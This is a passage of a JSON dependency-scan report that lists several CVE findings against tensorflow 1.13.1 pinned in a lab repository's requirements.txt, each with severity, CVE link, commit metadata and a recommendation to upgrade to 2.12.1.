            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37635 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37635)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "34d95c7c337549756b816d7f3f8290ba15f8e3bb"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37691",
          "ruleIndex": 207,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37691 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37691](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37691)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "92f17578b22ef068df5e41aacd742271e8b5b3d1"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37679",
          "ruleIndex": 208,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37679 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37679](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37679)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "738bd68a6240509b8b71d09992ac8d16d95105ed"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37669",
          "ruleIndex": 209,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37669 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37669](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37669)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e98258bd65dec37b4905458ad1eb6bbb9f582b7e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37688",
          "ruleIndex": 210,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37688 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37688](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37688)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "12261af8f78317eadf26da34fa6b644433f5c4d1"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37666",
          "ruleIndex": 211,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37666 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37666](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37666)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5ab8d4ddab46bdc784b991ab839387de34f26a30"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37676",
          "ruleIndex": 212,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37676 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37676](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37676)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ad3323226abfaa087974d6b0635465b78e87f26d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37643",
          "ruleIndex": 213,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37643 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37643](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37643)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c28e95c15c293769510dee4629c70ebfd3fee338"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37652",
          "ruleIndex": 214,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37652 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37652](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37652)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e32290482e9b15f8e3e880705921e8a044b2a2ce"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37660",
          "ruleIndex": 215,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37660 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37660](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37660)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "8e103f5b498440cace4f94179d3151b071dcc3b9"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37642",
          "ruleIndex": 216,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37642 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37642](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37642)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "6797ad01ae5bc64b90871cf83a61cb67a00dc115"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37640",
          "ruleIndex": 217,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37640 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37640](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37640)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0b89ab04bdf03efb72abe0824b8dd480d912d920"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37648",
          "ruleIndex": 218,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37648 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37648](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37648)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "85c5762aeed158088eefa6828782c76b3a510672"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37668",
          "ruleIndex": 219,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37668 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37668](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37668)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "41e6cee8161df0cde42d227453dc603e7cf77e8f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37662",
          "ruleIndex": 220,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37662 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37662](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37662)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a319f0abe326812c53c98cf21c50589a4c6122ab"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37649",
          "ruleIndex": 221,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37649 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37649](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37649)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "bcf299020a3e2b964b87d05489524a14f4fc7931"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37680",
          "ruleIndex": 222,
          "level": "warning",
          "message": {
